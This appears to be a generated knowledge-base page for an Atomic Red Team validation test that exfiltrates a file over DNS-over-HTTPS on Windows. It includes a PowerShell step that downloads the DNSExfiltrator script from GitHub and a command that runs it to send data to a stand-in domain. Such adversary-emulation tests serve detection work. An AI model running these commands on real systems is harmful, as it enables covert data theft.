---
atomic_guid: "c943d285-ada3-45ca-b3aa-7cd6500c6a48"
title: "DNSExfiltration (doh)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048"
attack_technique_name: "Exfiltration Over Alternative Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "c943d285-ada3-45ca-b3aa-7cd6500c6a48"
  - "DNSExfiltration (doh)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# DNSExfiltration (doh)

DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
!!! Test will fail without a domain under your control with A record and NS record !!! 
See this github page for more details - https://github.com/Arno0x/DNSExfiltrator

## Metadata

- Atomic GUID: c943d285-ada3-45ca-b3aa-7cd6500c6a48
- Technique: T1048: Exfiltration Over Alternative Protocol
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1048/T1048.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048]]

## Input Arguments

### doh

- description: Google or CloudFlare DoH (DNS over HTTP) server
- type: string
- default: google

### domain

- description: The domain name to use for DNS requests
- type: string
- default: target.example.com

### encoding

- description: Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.
- type: string

### password

- description: Password used to encrypt the data to be exfiltrated
- type: string
- default: atomic

### ps_module

- description: DNSExfiltrator powershell ps_module
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1

### time

- description: The time in milliseconds to wait between each DNS request
- type: string
- default: 500

## Dependencies

DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})

### Prerequisite Check

```powershell
if (Test-Path "#{ps_module}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
IWR "https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1" -OutFile "#{ps_module}"
```

## Executor

- name: powershell

### Command

```powershell
Import-Module "#{ps_module}"
Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml)
